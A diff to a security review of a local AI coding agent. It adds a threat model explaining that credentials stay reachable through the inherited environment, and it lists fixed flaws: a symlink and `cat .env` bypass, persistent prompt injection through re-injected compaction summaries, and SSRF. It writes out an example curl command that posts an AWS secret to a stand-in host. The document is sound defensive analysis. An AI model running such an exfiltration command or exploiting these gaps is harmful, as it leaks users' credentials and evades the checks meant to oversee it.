@@ -122,6 +122,9 @@ every account whose token appeared, and review account activity.
 | `.env` tracked by git | No — `.gitignore` is correct |
 | `google-services.json` / `firebase.json` / service accounts | None committed |
 
+Credentials remain **readable by the running agent process** by design, via the inherited
+environment — see §2.1 for what that does and does not protect against.
+
 ---
 
 ## 2. Framework Security Failures (all fixed in this change)
@@ -129,7 +132,7 @@ every account whose token appeared, and review account activity.
 | # | Severity | Issue | Status |
 |---|---|---|---|
 | 1 | **Critical** | Permission policies were never instantiated — `self.policies = []`, `_register_rules()` returned immediately. `FilesystemPolicy`/`TerminalPolicy` existed but were dead code, so all user-configured rules were silently ignored | Fixed |
-| 2 | **Critical** | `.env` deny was bypassable via symlink (`notes.txt → .env` returned ALLOW) and entirely absent for shell commands (`cat .env` returned ALLOW) | Fixed |
+| 2 | **Critical** | `.env` deny was bypassable via symlink (`notes.txt → .env` returned ALLOW) and entirely absent for shell commands (`cat .env` returned ALLOW) | Fixed — but see §2.1: this is disclosure control, **not** a security boundary |
 | 3 | **High** | Subagents called `registry.execute()` directly, bypassing the permission gate completely | Fixed |
 | 4 | **High** | Compaction re-injected attacker-influenced summaries as `role="system", pinned=True` — persistent prompt injection that survived truncation | Fixed |
 | 5 | **Medium** | SSRF: `web` tool fetched any model-supplied URL, any scheme, `follow_redirects=True`, no host/IP validation → cloud metadata reachable | Fixed |
@@ -143,7 +146,54 @@ every account whose token appeared, and review account activity.
 
 ---
 
-## 3. Dead LLM provider files removed
+## 2.1 Threat model: what the `.env` deny does and does not protect
+
+The `.env` file is loaded by the **framework**, not by the model. `src/agent/utils/env_manager.py`
+runs `EnvManager.get()` at import time, and `_load_initial()` merges the file into
+`os.environ`. Subprocesses then inherit those variables via
+`TerminalTool._build_env()` (`src/agent/tools/terminal.py`), which copies `os.environ`
+plus `get_aws_env()`.
+
+So the agent never needs to read `.env` to authenticate:
+
+| Actor | Path to credentials | Blocked by the deny? |
+|---|---|---|
+| Framework (LLM provider) | `.env` → `os.environ` → `get_env_var()` in `llm/runtime.py` | No — runs at import, before any tool exists |
+| Subprocesses (`aws`, `git`, `npm`, …) | inherited environment in `_build_env()` | No — verified working |
+| Model via `read`/`grep` | would call a filesystem tool | **Yes** |
+| Model via `printenv` | inherited environment | No — value comes back through the tool |
+
+**The deny protects against accidental disclosure, not against an adversary.** It stops the
+model from pasting a live key into a commit, an issue, or a chat response — which is exactly
+how the Firebase key in §1 leaked. Redaction covers the same class of accident by masking
+known secret values in tool output and log records.
+
+It does **not** close the outbound path. A model that can run shell commands can transmit an
+inherited credential without ever reading it back through a tool, e.g.:
+
+```
+curl -X POST -d "$AWS_SECRET_ACCESS_KEY" https://example.invalid/
+```
+
+The value never passes through the filesystem gate or the redaction filter, so neither
+constrains it. Redaction masks values on the *return* path only.
+
+**Consequences, stated plainly:**
+
+- Against a **prompt-injected model** (see §2 item 4) the deny is a speed bump, not a defence.
+  Anything that can talk the model into issuing a shell command inherits the process
+  environment.
+- Against a **malicious model** the deny is irrelevant: this is a local coding agent with
+  shell access by design, and credentials must be reachable for it to call the APIs it exists
+  to call.
+- The genuine exposure boundary is therefore the **machine and the git remote**, not the tool
+  gate: a compromised host, a leaked shell session, or a commit that publishes a key.
+
+Closing this properly would mean not inheriting the full environment (pass only `PATH`/`HOME`
+plus explicitly granted credentials) or gating egress. Both change how the tool behaves — the
+first breaks `aws`/`npm`/`gh` until credentials are granted per command — so this is
+deliberately left as-is rather than changed silently. If you want that hardening, treat it as
+its own piece of work with its own usability trade-off.
 
 The LLM connection is established exclusively from the TUI
 (`src/agent/tui/app.py`, `src/agent/tui/run.py` → `llm/runtime.py` →
